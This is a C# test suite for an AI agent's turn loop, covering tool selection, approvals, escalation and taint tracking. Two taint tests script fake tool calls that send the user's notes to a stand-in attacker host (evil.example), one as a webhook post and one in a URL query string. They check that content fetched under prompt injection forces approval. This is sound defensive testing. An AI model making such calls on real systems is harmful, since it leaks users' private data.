using System.Text.Json;
using Corvid.Abstractions.Events;
using Corvid.Abstractions.Sessions;
using Corvid.Abstractions.Tokens;
using Corvid.Approvals;
using Corvid.Kernel.Turns;
using Corvid.Models;
using Corvid.Tools;
using Microsoft.Extensions.AI;

namespace Corvid.Kernel.Tests;

public sealed class TurnLoopTests
{
    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    [Fact]
    public async Task A_confident_pick_offers_exactly_one_schema_and_a_read_only_call_runs_without_asking()
    {
        var generator = new FakeGenerator(Reply.Call("list_notes", """{"limit":5}"""), Reply.Say("You have no notes."))
        {
            YesNo = FakeGenerator.YesTo("fully handled"),
        };
        var prompter = FakePrompter.Always(approve: false);
        using var harness = new TurnHarness(generator, prompter: prompter);

        var result = await harness.RunAsync("list my notes");

        Assert.Equal(TurnStatus.Answered, result.Status);
        Assert.Equal("You have no notes.", result.Text);
        Assert.Equal((1, 1), (result.Steps, result.ToolCalls));
        // Plan §5.3 rule 2: the generator never sees a tool it was not offered.
        Assert.Equal(["list_notes"], generator.Calls[0].ToolNames);
        // done acted, so the answer was written with no tools on offer.
        Assert.Empty(generator.Calls[1].ToolNames);
        Assert.Empty(prompter.Prompts);

        // Ingress picked the tool; the step checkpoint asked again before the answer.
        var tool = harness.Decisions("tool")[0];
        Assert.Equal("offer_tool:list_notes", tool.Action);
        Assert.Equal("degraded", tool.Decider);
        Assert.Equal("stop", Assert.Single(harness.Decisions("done")).Action);
        var payloads = harness.Payloads();
        Assert.Equal("tool_succeeded", payloads.OfType<DecisionOutcomeRecorded>().Single(outcome => outcome.DecisionId == tool.DecisionId).Outcome);
        Assert.Collection(payloads.Where(item => item is not Decision and not DecisionOutcomeRecorded),
            item => Assert.Equal("list my notes", Assert.IsType<UserMessage>(item).Text),
            item => Assert.Equal("list_notes", Assert.IsType<ToolCallIssued>(item).ToolName),
            item => Assert.False(Assert.IsType<ToolResult>(item).IsError),
            item => Assert.Equal("You have no notes.", Assert.IsType<AssistantMessage>(item).Text));
    }

    [Fact]
    public async Task An_unconfident_pick_offers_the_whole_shortlist()
    {
        var generator = new FakeGenerator(Reply.Say("Which notes?"));
        using var harness = new TurnHarness(generator);

        var result = await harness.RunAsync("list or delete notes");

        Assert.Equal(TurnStatus.Answered, result.Status);
        var tool = harness.Decisions("tool")[0];
        Assert.Equal("offer_shortlist", tool.Action);
        Assert.Equal(["add_note", "clear_notes", "list_notes"], generator.Calls[0].ToolNames.Order(StringComparer.Ordinal));
        // Each checkpoint is one decider request: ingress asked its questions together, on one state.
        var ingress = harness.Decisions().Take(4).ToList();
        Assert.Equal(["clarify", "difficulty", "intent", "tool"], ingress.Select(d => d.QuestionId));
        Assert.Single(ingress.Select(decision => decision.State!.Value.GetRawText()).Distinct());
    }

    [Fact]
    public async Task A_confident_none_offers_no_tools()
    {
        var generator = new FakeGenerator(Reply.Say("Hello!"));
        using var harness = new TurnHarness(generator);

        await harness.RunAsync("hello there");

        Assert.Equal("offer_tool:none", harness.Decisions("tool")[0].Action);
        Assert.Empty(generator.Calls[0].ToolNames);
    }

    [Fact]
    public async Task Invalid_arguments_are_repaired_once_with_the_expected_shape()
    {
        var generator = new FakeGenerator(
            Reply.Call("list_notes", """{"limit":"five"}"""),
            Reply.Call("list_notes", """{"limit":5}"""),
            Reply.Say("Done."));
        using var harness = new TurnHarness(generator);

        var result = await harness.RunAsync("list my notes");

        Assert.Equal(TurnStatus.Answered, result.Status);
        var results = harness.Payloads().OfType<ToolResult>().ToList();
        Assert.Equal([true, false], results.Select(item => item.IsError));
        var error = results[0].Result;
        Assert.Contains("'limit' must be integer", error.GetProperty("details")[0].GetString());
        Assert.Equal("object", error.GetProperty("expected").GetProperty("type").GetString());
        // The repair call saw the error as the call's result.
        Assert.Contains("'limit' must be integer", generator.Calls[1].AllText);
        Assert.Contains("\"expected\"", generator.Calls[1].AllText);
        Assert.Empty(harness.Payloads().OfType<ModelSwitched>());
    }

    [Fact]
    public async Task A_second_failure_escalates_and_the_turn_continues_on_the_larger_model_then_de_escalates()
    {
        var generator = new FakeGenerator(
            Reply.Call("list_notes", """{"limit":"five"}"""),
            Reply.Call("list_notes", """{"count":5}"""));
        var large = new FakeGenerator(Reply.Call("list_notes", """{"limit":5}"""), Reply.Say("Done on the large model.")) { Name = "large" };
        using var harness = new TurnHarness(generator, escalation: large);

        var result = await harness.RunAsync("list my notes");

        Assert.Equal(TurnStatus.Answered, result.Status);
        Assert.Equal("Done on the large model.", result.Text);
        Assert.Equal(["gen-large: repair"], result.Escalations);
        Assert.Equal(2, large.Calls.Count);
        Assert.Contains("unknown argument 'count'", GeneratorCall.Flatten(harness.Payloads().OfType<ToolResult>().ElementAt(1).Result));
        // Plan §6: after the escalated turn the slot returns to its default.
        Assert.Equal(["escalation", "de_escalation"], harness.Payloads().OfType<ModelSwitched>().Select(item => item.Reason));
        Assert.Same(harness.GeneratorBinding, harness.Slots.Current(ModelSlots.Generator));
    }

    [Fact]
    public async Task A_second_failure_with_nowhere_to_escalate_fails_the_turn()
    {
        var generator = new FakeGenerator(Reply.Call("list_notes", """{"limit":"five"}"""), Reply.Call("nonexistent"));
        using var harness = new TurnHarness(generator);

        var result = await harness.RunAsync("list my notes");

        Assert.Equal(TurnStatus.Failed, result.Status);
        Assert.Contains("no larger model", result.Text);
        Assert.Contains("'nonexistent' is not one of the tools offered: list_notes",
            GeneratorCall.Flatten(harness.Payloads().OfType<ToolResult>().Last().Result));
        Assert.Empty(harness.Notes.Notes);
    }

    [Fact]
    public async Task Read_only_calls_in_one_response_run_concurrently()
    {
        // Each tool waits until both have started, so this completes only if they run together (§3.3).
        var started = 0;
        var both = new TaskCompletionSource(TaskCreationOptions.RunContinuationsAsynchronously);
        TestTool Reader(string name) => TestTool.Create(name, $"Read the {name} weather.", new ToolRisk(SideEffects.None, false, false),
            """{"type":"object","properties":{}}""", async (_, token) =>
            {
                if (Interlocked.Increment(ref started) == 2)
                    both.TrySetResult();
                await both.Task.WaitAsync(TimeSpan.FromSeconds(30), token);
                return name;
            });
        var generator = new FakeGenerator(_ => Reply.Calls(("north", "{}", "n1"), ("south", "{}", "s1")), Reply.Say("Both read."));
        using var harness = new TurnHarness(generator, tools: tools => { tools.Add(Reader("north")); tools.Add(Reader("south")); });

        var result = await harness.RunAsync("weather north and south");

        Assert.Equal("Both read.", result.Text);
        Assert.Equal(["n1", "s1"], harness.Payloads().OfType<ToolCallIssued>().Select(call => call.CallId));
        Assert.All(harness.Payloads().OfType<ToolResult>(), item => Assert.False(item.IsError));
    }

    [Fact]
    public async Task A_binding_failure_inside_the_tool_counts_as_a_failed_call()
    {
        var bind = TestTool.Create("set_level", "Set the weather level.", new ToolRisk(SideEffects.None, false, false),
            """{"type":"object","properties":{"level":{"type":"string"}},"required":["level"]}""",
            (_, _) => throw new ToolArgumentException("Argument 'level' must be low or high; got \"medium\".", "level"),
            new ToolParameter("level", null, true, false));
        var generator = new FakeGenerator(Reply.Call("set_level", """{"level":"medium"}"""), Reply.Say("ok"));
        using var harness = new TurnHarness(generator, tools: tools => tools.Add(bind));

        await harness.RunAsync("weather level");

        var error = Assert.Single(harness.Payloads().OfType<ToolResult>());
        Assert.True(error.IsError);
        Assert.Contains("must be low or high", error.Result.GetRawText());
    }

    [Fact]
    public async Task Side_effecting_calls_ask_and_run_only_when_approved_and_the_request_names_the_call()
    {
        var generator = new FakeGenerator(Reply.Call("add_note", """{"text":"buy milk"}""", "c-add"), Reply.Say("Saved."));
        var prompter = FakePrompter.Always(approve: true);
        using var harness = new TurnHarness(generator, prompter: prompter);

        var result = await harness.RunAsync("note: buy milk");

        Assert.Equal(TurnStatus.Answered, result.Status);
        Assert.Single(prompter.Prompts);
        Assert.Equal("buy milk", Assert.Single(harness.Notes.Notes).Text);
        var request = Assert.Single(harness.Payloads().OfType<ApprovalRequested>());
        Assert.Equal("c-add", request.CallId);
        Assert.True(Assert.Single(harness.Payloads().OfType<ApprovalResolved>()).Approved);
        // The risk decision is the pre-execute checkpoint; without Kev the gate asks.
        Assert.Equal("ask", Assert.Single(harness.Decisions("risk")).Action);
    }

    [Fact]
    public async Task A_denied_call_does_not_run_and_the_generator_sees_why()
    {
        var generator = new FakeGenerator(Reply.Call("clear_notes"), Reply.Say("I did not delete them."));
        using var harness = new TurnHarness(generator, prompter: FakePrompter.Always(approve: false));
        harness.Notes.AddNote("keep me");

        var result = await harness.RunAsync("delete every note");

        Assert.Equal("I did not delete them.", result.Text);
        Assert.Single(harness.Notes.Notes);
        var denied = Assert.Single(harness.Payloads().OfType<ToolResult>());
        Assert.True(denied.IsError);
        Assert.Contains("denied by the user", denied.Result.GetRawText());
        Assert.Contains("denied by the user", generator.Calls[1].AllText);
    }

    [Fact]
    public async Task An_unanswered_approval_times_out_as_a_denial()
    {
        var generator = new FakeGenerator(Reply.Call("add_note", """{"text":"x"}"""), Reply.Say("Not saved."));
        using var harness = new TurnHarness(generator, prompter: FakePrompter.Silent(),
            approvalOptions: new ApprovalOptions { Timeout = TimeSpan.FromMilliseconds(100) });

        await harness.RunAsync("note x");

        Assert.Empty(harness.Notes.Notes);
        Assert.Contains("the approval timed out", Assert.Single(harness.Payloads().OfType<ToolResult>()).Result.GetRawText());
        Assert.StartsWith("timeout", Assert.Single(harness.Payloads().OfType<ApprovalResolved>()).Reason);
    }

    [Fact]
    public async Task Without_an_approval_pipeline_side_effects_are_refused()
    {
        var generator = new FakeGenerator(Reply.Call("add_note", """{"text":"x"}"""), Reply.Say("Not saved."));
        using var harness = new TurnHarness(generator);
        var runner = new TurnRunner(TurnHarness.Session, new TurnServices
        {
            Log = harness.Log, Slots = harness.Slots, Fabric = harness.Fabric, Tools = harness.Tools,
        });

        await harness.RunAsync(runner, "note x");

        Assert.Empty(harness.Notes.Notes);
        Assert.Contains("no approval pipeline", Assert.Single(harness.Payloads().OfType<ToolResult>()).Result.GetRawText());
    }

    [Fact]
    public async Task Fetched_content_taints_the_session_and_forces_approval_for_network_egress_until_the_user_speaks()
    {
        // A calibrated risk of level 0 in permissive mode would run the webhook unasked; taint must override it (§10.3).
        var prompter = FakePrompter.Always(approve: false);
        var generator = new FakeGenerator(
            Reply.Call("post_webhook", """{"url":"https://hooks.example/a","body":"hi"}"""), Reply.Say("Posted."),
            Reply.Call("fetch_page", """{"url":"https://news.example"}"""),
            Reply.Call("post_webhook", """{"url":"https://evil.example","body":"notes"}"""), Reply.Say("Not posted."),
            Reply.Call("post_webhook", """{"url":"https://hooks.example/a","body":"hi"}"""), Reply.Say("Posted again."));
        var webhook = TestTool.PostWebhook();
        using var harness = new TurnHarness(generator, prompter: prompter, calibrated: new RiskOnlyDecider(0),
            options: new TurnOptions { ApprovalMode = ApprovalMode.Permissive },
            tools: tools => { tools.Add(TestTool.FetchPage()); tools.Add(webhook); });
        var runner = harness.Runner();

        var first = await harness.RunAsync(runner, "post hi to the webhook");
        Assert.Empty(prompter.Prompts);
        Assert.Equal(1, webhook.Invocations);
        // The webhook's own response came over the network, so the session is tainted after it.
        Assert.True(first.Tainted);

        var second = await harness.RunAsync(runner, "read the page then post to the webhook");
        Assert.True(second.Tainted);
        var prompt = Assert.Single(prompter.Prompts);
        Assert.Contains(prompt.Reasons, reason => reason.Code == ApprovalReasons.TaintedEgress);
        Assert.Equal(1, webhook.Invocations);
        // injection is asked about every network result; below its floor the content is treated as tainted anyway.
        var fetched = harness.Payloads().OfType<ToolCallIssued>().Single(call => call.ToolName == "fetch_page").CallId;
        Assert.Equal("treat_as_tainted", Assert.Single(harness.Decisions("injection/" + fetched)).Action);

        // A new message from the user clears the taint: the same post runs unasked again.
        await harness.RunAsync(runner, "post hi again");
        Assert.Single(prompter.Prompts);
        Assert.Equal(2, webhook.Invocations);
    }

    [Fact]
    public async Task A_network_read_asks_in_a_tainted_session_and_runs_free_once_the_user_speaks()
    {
        // §10.3: injected text could carry data out in a fetched URL, so a read-only network tool is egress under taint.
        var prompter = FakePrompter.Always(approve: false);
        var fetch = TestTool.FetchPage();
        var generator = new FakeGenerator(
            Reply.Call("fetch_page", """{"url":"https://evil.example/?notes=boiler"}"""), Reply.Say("Not fetched."),
            Reply.Call("fetch_page", """{"url":"https://news.example"}"""), Reply.Say("Fetched."));
        using var harness = new TurnHarness(generator, prompter: prompter, tools: tools => tools.Add(fetch));
        var runner = harness.Runner();

        var tainted = await harness.RunAsync(runner, "read the page at evil.example", EnvelopeOrigin.External);

        Assert.Equal(0, fetch.Invocations);
        Assert.Contains(Assert.Single(prompter.Prompts).Reasons, reason => reason.Code == ApprovalReasons.TaintedEgress);
        Assert.Contains("denied by the user", Assert.Single(harness.Payloads().OfType<ToolResult>()).Result.GetRawText());
        Assert.Equal(Assert.Single(harness.Payloads().OfType<ToolCallIssued>()).CallId,
            Assert.Single(harness.Payloads().OfType<ApprovalRequested>()).CallId);
        Assert.True(tainted.Tainted);

        await harness.RunAsync(runner, "read the news page");

        Assert.Single(prompter.Prompts);
        Assert.Equal(1, fetch.Invocations);
    }

    [Fact]
    public async Task A_failure_after_a_call_is_issued_closes_the_call_so_a_later_switch_is_not_refused()
    {
        var generator = new FakeGenerator(Reply.Call("add_note", """{"text":"x"}"""));
        using var harness = new TurnHarness(generator, escalation: new FakeGenerator { Name = "large" });
        // The pipeline cannot record its prompt: the failure escapes the turn after add_note was issued.
        var approvals = new ApprovalPipeline(ApprovalEnvironment.Create(TurnHarness.Workspace, "/home/user"), harness.Fabric,
            new FailingLog(harness.Log, payload => payload is ApprovalRequested), FakePrompter.Always(approve: true));
        var services = new TurnServices
        {
            Log = harness.Log,
            Slots = harness.Slots,
            Fabric = harness.Fabric,
            Tools = harness.Tools,
            Approvals = approvals,
            Options = harness.Options,
        };

        await Assert.ThrowsAsync<IOException>(() =>
            new TurnRunner(TurnHarness.Session, services).RunAsync(new Envelope(TurnHarness.Session, "cli", "note x"), Ct));

        Assert.Empty(harness.Notes.Notes);
        var closed = Assert.Single(harness.Payloads().OfType<ToolResult>());
        Assert.True(closed.IsError);
        Assert.Contains("failed: disk full", closed.Result.GetRawText());
        var switched = await harness.Slots.SwitchAsync(ModelSlots.Generator, harness.EscalationBinding!, cancellationToken: Ct);
        Assert.Equal(SwitchStatus.Switched, switched.Status);
    }

    [Fact]
    public async Task Without_escalation_allowed_a_second_failure_fails_the_turn_even_with_a_larger_model_bound()
    {
        var generator = new FakeGenerator(Reply.Call("list_notes", """{"limit":"five"}"""), Reply.Call("list_notes", """{"count":5}"""));
        var large = new FakeGenerator { Name = "large" };
        using var harness = new TurnHarness(generator, escalation: large, options: new TurnOptions { EscalationAllowed = false });

        var result = await harness.RunAsync("list my notes");

        Assert.Equal(TurnStatus.Failed, result.Status);
        Assert.Empty(result.Escalations);
        Assert.Empty(large.Calls);
        Assert.Empty(harness.Payloads().OfType<ModelSwitched>());
    }

    private sealed class FailingLog(IEventLog inner, Func<SessionEvent, bool> fails) : IEventLog
    {
        public long GetHead(string sessionId, CancellationToken cancellationToken = default) => inner.GetHead(sessionId, cancellationToken);

        public IReadOnlyList<StoredEvent> Append(string sessionId, long expectedHead, IReadOnlyList<EventData> events,
            CancellationToken cancellationToken = default) =>
            events.Any(item => fails(item.Payload)) ? throw new IOException("disk full")
                : inner.Append(sessionId, expectedHead, events, cancellationToken);

        public IReadOnlyList<StoredEvent> Read(string sessionId, long afterSequence = 0, long throughSequence = long.MaxValue,
            int limit = 256, CancellationToken cancellationToken = default) =>
            inner.Read(sessionId, afterSequence, throughSequence, limit, cancellationToken);
    }

    [Fact]
    public async Task An_external_envelope_taints_the_session()
    {
        var prompter = FakePrompter.Always(approve: true);
        var generator = new FakeGenerator(Reply.Call("post_webhook", """{"url":"https://hooks.example/a","body":"hi"}"""), Reply.Say("ok"));
        using var harness = new TurnHarness(generator, prompter: prompter, calibrated: new RiskOnlyDecider(0),
            options: new TurnOptions { ApprovalMode = ApprovalMode.Permissive }, tools: tools => tools.Add(TestTool.PostWebhook()));

        var result = await harness.RunAsync(harness.Runner(), "post hi to the webhook", EnvelopeOrigin.External);

        Assert.True(result.Tainted);
        Assert.Contains(Assert.Single(prompter.Prompts).Reasons, reason => reason.Code == ApprovalReasons.TaintedEgress);
    }

    [Fact]
    public async Task Narration_instead_of_a_call_reprompts_with_an_instruction_on_a_template_rendered_model()
    {
        var generator = new FakeGenerator(Reply.Say("Here are your notes: none."), Reply.Call("list_notes"), Reply.Say("No notes."))
        {
            RejectRequiredMode = true,
        };
        using var harness = new TurnHarness(generator);

        var result = await harness.RunAsync("list my notes");

        Assert.Equal("No notes.", result.Text);
        Assert.Equal(1, result.ToolCalls);
        Assert.Contains("Call the list_notes tool now", generator.Calls[1].LastText);
        Assert.IsNotType<RequiredChatToolMode>(generator.Calls[1].Options!.ToolMode);
        // The narration was never logged as an answer.
        Assert.DoesNotContain(harness.Payloads().OfType<AssistantMessage>(), message => message.Text.StartsWith("Here are", StringComparison.Ordinal));
    }

    [Fact]
    public async Task Narration_on_a_native_model_requires_the_picked_tool()
    {
        var generator = new FakeGenerator(Reply.Say("Here are your notes: none."), Reply.Call("list_notes"), Reply.Say("No notes."));
        using var harness = new TurnHarness(generator, toolCalls: ToolCallSupport.Native);

        await harness.RunAsync("list my notes");

        var mode = Assert.IsType<RequiredChatToolMode>(generator.Calls[1].Options!.ToolMode);
        Assert.Equal("list_notes", mode.RequiredFunctionName);
    }

    [Fact]
    public async Task A_disagreement_with_an_extracted_slot_is_shown_once_then_the_generator_decides()
    {
        var generator = new FakeGenerator(
            Reply.Call("add_note", """{"text":"buy bread"}"""),
            Reply.Call("add_note", """{"text":"buy bread"}"""),
            Reply.Say("Saved."));
        var extractor = new FakeExtractor(0.95f, ("The note text.", "buy milk"));
        using var harness = new TurnHarness(generator, extractor: extractor, prompter: FakePrompter.Always(approve: true));

        var result = await harness.RunAsync("note: buy milk");

        var disagreement = Assert.Single(result.Disagreements);
        Assert.Equal(("text", "buy bread", "buy milk"), (disagreement.Parameter, disagreement.Argument, disagreement.Extracted));
        var first = harness.Payloads().OfType<ToolResult>().First();
        Assert.True(first.IsError);
        Assert.Equal("buy milk", first.Result.GetProperty("from_request").GetProperty("text").GetString());
        Assert.Equal("buy bread", Assert.Single(harness.Notes.Notes).Text);
    }

    [Fact]
    public async Task Entities_from_the_extractor_reach_the_turn_state()
    {
        var generator = new FakeGenerator(Reply.Say("ok"));
        var extractor = new FakeExtractor(0.9f, ("person", "sam"), ("date", "friday"));
        using var harness = new TurnHarness(generator, extractor: extractor);

        await harness.RunAsync("remind sam on friday");

        var state = harness.Decisions("intent")[0].State!.Value;
        Assert.Equal("sam", state.GetProperty("entities").GetProperty("person")[0].GetString());
        Assert.Equal("friday", state.GetProperty("entities").GetProperty("date")[0].GetString());
    }

    [Fact]
    public async Task The_generators_token_counter_sizes_the_turn_state()
    {
        var counter = new CountingCounter();
        var generator = new FakeGenerator(Reply.Say("ok")) { Counter = counter };
        using var harness = new TurnHarness(generator);

        await harness.RunAsync("hello there");

        Assert.True(counter.Calls > 0);
    }

    [Fact]
    public async Task Clarify_asks_one_question_instead_of_acting()
    {
        var generator = new FakeGenerator(Reply.Say("Which reminder do you mean?")) { YesNo = FakeGenerator.YesTo("ambiguous") };
        using var harness = new TurnHarness(generator);

        var result = await harness.RunAsync("move it");

        Assert.Equal(TurnStatus.Clarifying, result.Status);
        Assert.Empty(generator.Calls[0].ToolNames);
        Assert.Contains("Ask the user one short question", generator.Calls[0].LastText);
    }

    [Fact]
    public async Task The_step_budget_ends_the_loop_with_an_answer_and_no_tools()
    {
        var generator = new FakeGenerator(Reply.Call("list_notes"), Reply.Call("list_notes"), Reply.Call("list_notes"), Reply.Say("Stopping."));
        using var harness = new TurnHarness(generator, options: new TurnOptions { MaxSteps = 2 });

        var result = await harness.RunAsync("list my notes");

        Assert.Equal(TurnStatus.StepBudgetExhausted, result.Status);
        Assert.Equal(2, result.Steps);
        Assert.Empty(generator.Calls[2].ToolNames);
        Assert.Contains("step budget", generator.Calls[2].LastText);
    }

    [Fact]
    public async Task Stuck_without_an_escalation_target_finishes_without_tools()
    {
        var generator = new FakeGenerator(Reply.Call("list_notes"), Reply.Say("I could not get further.")) { YesNo = FakeGenerator.YesTo("repeating") };
        using var harness = new TurnHarness(generator);

        var result = await harness.RunAsync("list my notes");

        Assert.Equal(TurnStatus.Stuck, result.Status);
        Assert.Empty(generator.Calls[1].ToolNames);
    }

    [Fact]
    public async Task Old_results_are_stubbed_by_clear_results_with_the_event_that_holds_them()
    {
        var generator = new FakeGenerator(Reply.Call("list_notes"), Reply.Call("list_notes"), Reply.Call("list_notes"), Reply.Say("Done."));
        using var harness = new TurnHarness(generator);
        harness.Notes.AddNote("a long note about the boiler service");

        await harness.RunAsync("list my notes");

        // After the third result, the first is older than the last two: clear_results is asked about it and, without Kev,
        // takes its below-floor rule.
        var clear = Assert.Single(harness.Decisions(), d => d.QuestionId.StartsWith("clear_results/", StringComparison.Ordinal));
        Assert.Equal("stub_older_than_last_2", clear.Action);
        var callId = clear.QuestionId["clear_results/".Length..];
        var sequence = harness.Events().Single(item => item.Payload is ToolResult result && result.CallId == callId).Sequence;
        Assert.Contains($"[cleared: list_notes result, ", generator.Calls[3].AllText);
        Assert.Contains($"re-run or see event {sequence}]", generator.Calls[3].AllText);
        // The raw result stays in the log.
        Assert.Contains("boiler", harness.Payloads().OfType<ToolResult>().First().Result.GetRawText());
    }

    [Fact]
    public async Task Cancelling_a_turn_closes_its_open_calls_so_a_later_switch_is_not_refused()
    {
        using var cancel = new CancellationTokenSource();
        var generator = new FakeGenerator(Reply.Call("add_note", """{"text":"x"}"""));
        var prompter = new FakePrompter(async (_, token) =>
        {
            await cancel.CancelAsync();
            await Task.Delay(Timeout.Infinite, token);
            return ApprovalAnswer.Approve();
        });
        using var harness = new TurnHarness(generator, escalation: new FakeGenerator { Name = "large" }, prompter: prompter);

        var result = await harness.Runner().RunAsync(new Envelope(TurnHarness.Session, "cli", "note x"), cancel.Token);

        Assert.Equal(TurnStatus.Cancelled, result.Status);
        Assert.Null(result.Text);
        Assert.Empty(harness.Notes.Notes);
        Assert.Equal("cancelled", Assert.Single(harness.Payloads().OfType<ApprovalResolved>()).Reason);
        Assert.Contains("cancelled", Assert.Single(harness.Payloads().OfType<ToolResult>()).Result.GetRawText());
        var switched = await harness.Slots.SwitchAsync(ModelSlots.Generator, harness.EscalationBinding!, cancellationToken: Ct);
        Assert.Equal(SwitchStatus.Switched, switched.Status);
    }

    [Fact]
    public async Task Remember_at_egress_starts_the_memory_write_path_which_stages_without_kev()
    {
        var generator = new FakeGenerator(Reply.Say("Noted.")) { YesNo = FakeGenerator.YesTo("future conversations") };
        using var store = new MemoryStore();
        using var harness = new TurnHarness(generator);
        var writer = store.Writer(harness);
        var runner = new TurnRunner(TurnHarness.Session, new TurnServices
        {
            Log = harness.Log, Slots = harness.Slots, Fabric = harness.Fabric, Tools = harness.Tools, Memory = writer,
        });

        var result = await harness.RunAsync(runner, "my sister is called Ana");

        Assert.Equal("start_memory_write", Assert.Single(harness.Decisions("remember")).Action);
        Assert.StartsWith("staged ", result.MemoryWrite);
        Assert.Equal("staged", Assert.Single(harness.Payloads().OfType<MemoryWritten>()).Operation);
        Assert.Equal("stage_for_review", Assert.Single(harness.Decisions("memory_op")).Action);
    }

    private sealed class CountingCounter : ITokenCounter
    {
        public int Calls;

        public int CountTokens(string text)
        {
            Interlocked.Increment(ref Calls);
            return (text.Length + 3) / 4;
        }
    }
}
